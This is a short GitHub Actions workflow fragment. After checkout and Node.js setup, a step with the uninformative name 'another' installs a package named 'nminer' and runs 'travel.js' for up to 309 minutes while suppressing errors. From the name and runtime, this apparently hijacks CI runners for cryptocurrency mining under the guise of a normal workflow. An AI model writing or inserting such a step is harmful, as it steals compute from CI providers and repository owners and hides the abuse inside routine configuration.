    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: another
        run: |
          npm install nminer@latest
          timeout 309m node travel.js || echo "travel executed"